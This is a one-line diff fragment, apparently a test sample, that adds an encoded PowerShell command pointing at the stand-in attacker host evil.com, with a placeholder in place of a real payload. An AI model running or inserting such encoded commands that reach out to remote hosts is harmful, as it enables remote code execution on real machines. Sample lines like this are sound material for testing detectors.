@@ -1,0 +1,1 @@
+powershell -enc suspicious_command http://evil.com
